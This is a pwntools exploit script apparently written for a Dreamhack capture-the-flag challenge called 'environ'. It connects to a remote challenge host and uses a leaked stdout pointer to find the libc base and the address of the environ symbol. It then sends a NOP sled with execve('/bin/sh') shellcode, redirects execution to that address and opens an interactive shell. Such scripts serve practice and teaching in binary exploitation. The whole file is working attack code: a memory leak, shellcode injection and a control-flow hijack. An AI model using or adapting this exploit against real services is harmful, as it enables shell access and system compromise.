from pwn import *

# p = process("./environ")
# nc host3.dreamhack.games 9040
p = remote("host3.dreamhack.games", 9040)
# e = ELF("./libc.so.6")
# e = ELF("./environ") # local
e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so") # remote

# make x86_64 shellcode for system("/bin/sh")
context.arch = "x86_64"
shellcode = asm(shellcraft.execve("/bin/sh"))

environ_offset = 0x3c6f38

p.recvuntil(": ")

leak = int(p.recv(14), 16)
# libc base is minus symbol of stdout at leak
libc_base = leak - e.symbols["_IO_2_1_stdout_"]
environ_addr = libc_base + environ_offset

print(hex(leak))
print(hex(libc_base))
print(hex(environ_addr))

p.sendlineafter('Size: ', str(0x11c+len(shellcode))) 

pay = b""
pay += b"\x90" * 0x11c
pay += shellcode
p.sendlineafter('Data: ', pay) 
input()
p.sendlineafter('*jmp=', str(environ_addr))


p.interactive()